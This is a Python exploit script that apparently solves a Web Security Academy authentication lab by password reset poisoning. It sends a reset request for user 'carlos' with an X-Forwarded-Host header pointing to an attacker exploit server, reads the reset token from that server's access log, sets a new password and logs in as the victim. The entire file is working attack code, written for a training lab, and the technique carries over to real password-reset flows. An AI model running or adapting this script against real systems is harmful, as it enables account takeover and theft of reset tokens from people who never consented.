#!/usr/bin/env python3 

import requests
import urllib3
import argparse
import subprocess
import re
from bs4 import BeautifulSoup
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Authentication Web Security Academy

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net"
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url
s = requests.Session()

def get_session(url):
    r = requests.get(url, verify=False)
    sess_line = str(r.cookies)
    spl_sess1 = sess_line.split("session=", 1)[1]
    global sess
    sess = spl_sess1.split(" ", 1)[0]
    return sess

def exp_hostname(url):
    r = requests.get(url, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    for a in soup.find_all('a', href=True):
        if ('exploit' in a['href']):
            global hostname, exp_dom
            hostname = a['href']
            exp_dom = hostname.split("//", 1)[1]
            return exp_dom

def pwd_res(s, url, sess, hostname, exp_dom):
    forgot_path = '/forgot-password'
    data = {
        "username": "carlos"
    }
    headers = {
        "Cookie": "session=" + sess,
        "X-Forwarded-Host": exp_dom,
        "Origin": url,
        "Referer": url + forgot_path
    }
    s.post(url + forgot_path, verify=False, data=data, headers=headers)
    s.get(hostname, verify=False)
    data1 = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\n Content-Type: application/javascript; charset=utf-8",
        "responseBody": "Hello, world!",
        "formAction": "ACCESS_LOG"
    }
    headers1 = {
        "Origin": url,
        "Referer": url + '/'
    }
    r = s.post(hostname, verify=False, data=data1, headers=headers1)
    for line in r.content.splitlines():
        if (b'GET /forgot-password?temp-forgot-password-token=' in line):
            sl = line.decode("utf-8")
            res = str(re.search(r'[0-9a-zA-Z]{32}', sl))
            spl1 = res.split("match='", 1)[1]
            temp_token = spl1.split("'", 1)[0]
        else:
            pass
    data2 = {
        "temp-forgot-password-token": temp_token,
        "new-password-1": "test",
        "new-password-2": "test"
    }
    headers2 = {
        "Cookie": "session=" + sess
    }
    s.post(url + forgot_path + '?temp-forgot-password-token=' + temp_token, verify=False, data=data2)
    data3 = {
        "username": "carlos",
        "password": "test"
    }
    s.post(url + '/login', verify=False, data=data3, headers=headers2)
    r1 = s.get(url, verify=False)
    if (b'Congratulations' in r1.content):
        print("(+) Authentication Successful!")
        subprocess.call(["firefox", url])
    else:
        print("(-) Authentication Failed")

def main():
    
    print("(+) Exploiting Authentication")

    get_session(url)

    exp_hostname(url)
    
    pwd_res(s, url, sess, hostname, exp_dom)

if __name__ == "__main__":
    main()
